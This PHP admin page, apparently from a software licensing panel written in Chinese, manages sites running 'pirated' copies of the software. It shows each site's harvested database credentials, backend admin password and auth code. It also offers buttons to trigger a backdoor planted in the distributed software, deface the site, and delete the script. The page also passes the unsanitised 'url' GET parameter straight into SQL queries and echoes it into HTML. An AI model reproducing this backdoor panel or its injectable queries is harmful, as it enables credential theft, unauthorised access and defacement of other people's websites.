<?php
/**
 * 授权列表
**/
include("../includes/common.php");
$title='站点信息';
include './head.php';
if($islogin==1){}else exit("<script language='javascript'>window.location.href='./login.php';</script>");
?>
<?php
$url = $_GET['url'];
$row=$DB->get_row("SELECT * FROM auth_site WHERE url='$url' limit 1");
if($row['active'] != 1){}else exit("<script language='javascript'>alert('此站点位于正版列表内！');history.go(-1);</script>");
$db=$DB->get_row("SELECT * FROM auth_block WHERE url='$url' limit 1");
?>
<div class="header bg-primary pb-6">
      <div class="container-fluid">
        <div class="header-body">
          <div class="row align-items-center py-4">
            <div class="col-lg-6 col-7">
              <h6 class="h2 text-white d-inline-block mb-0">添加授权</h6>
              <nav aria-label="breadcrumb" class="d-none d-md-inline-block ml-md-4">
                <ol class="breadcrumb breadcrumb-links breadcrumb-dark">
                  <li class="breadcrumb-item"><a href="index.php"><i class="fas fa-home"></i></a></li>
                  <li class="breadcrumb-item"><a href="#">盗版管理</a></li>
                  <li class="breadcrumb-item active" aria-current="page">站点信息</li>
                </ol>
              </nav>
            </div>
            <div class="col-lg-6 col-5 text-right">
              <a href="#" class="btn btn-sm btn-neutral">New</a>
              <a href="#" class="btn btn-sm btn-neutral">Filters</a>
            </div>
          </div>
        </div>
      </div>
    </div>
    
<div class="container-fluid mt--6">
      <div class="card mb-4">
        <!-- Card header -->
        <div class="card-header">
          <h3 class="mb-0">站点信息</h3>
        </div>
                <!-- Card body -->
        <div class="card-body">
          <!-- Form groups used in grid -->
          <div class="row">
            <div class="card-body">
<li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>入库站网址：</b> <?=$url?></a></li>
<li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>数据库账号：</b> <?=$db['user']?></a></li>
<li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>数据库密码：</b> <?=$db['pwd']?></a></li>
<li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>数据库名称：</b> <?=$db['dbname']?></a></li>
<li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>后台用户名：</b> <?=$db['admin_user']?></a></li>
<li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>后台登陆密：</b> <?=$db['admin_pass']?></a></li>
<li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>盗版授权码：</b> <?=$db['authcode']?></a></li>
<li class="list-group-item"><span class="glyphicon glyphicon-time"></span> <b>盗版入库时间：</b><?=$db['date']?> </li>
</li>
</ul>
</br>
<a href="http://<?=urlencode($url)?>" class="btn btn-block btn-primary" target="_blank">一键访问</a>
<a href="http://<?=urlencode($url)?>/index.php?hm" class="btn btn-block btn-success" target="_blank">启动后门</a>
<a href="http://<?=urlencode($url)?>/hm.php?mod=my" class="btn btn-block btn-warning" target="_blank">启动挂黑</a>
<a href="http://<?=urlencode($url)?>/hm.php?mod=del" class="btn btn-block btn-danger" target="_blank">删除脚本</a>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
  <script src="/assets/manage/vendor/jquery/dist/jquery.min.js"></script>
  <script src="/assets/manage/vendor/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
  <script src="/assets/manage/vendor/js-cookie/js.cookie.js"></script>
  <script src="/assets/manage/vendor/jquery.scrollbar/jquery.scrollbar.min.js"></script>
  <script src="/assets/manage/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js"></script>
  <!-- Optional JS -->
  <script src="/assets/manage/vendor/chart.js/dist/Chart.min.js"></script>
  <script src="/assets/manage/vendor/chart.js/dist/Chart.extension.js"></script>
  <!-- Argon JS -->
  <script src="/assets/manage/js/argon.js?v=1.1.0"></script>
  <!-- Demo JS - remove this in your project -->
  <script src="/assets/manage/js/demo.min.js"></script>
</body>
</html>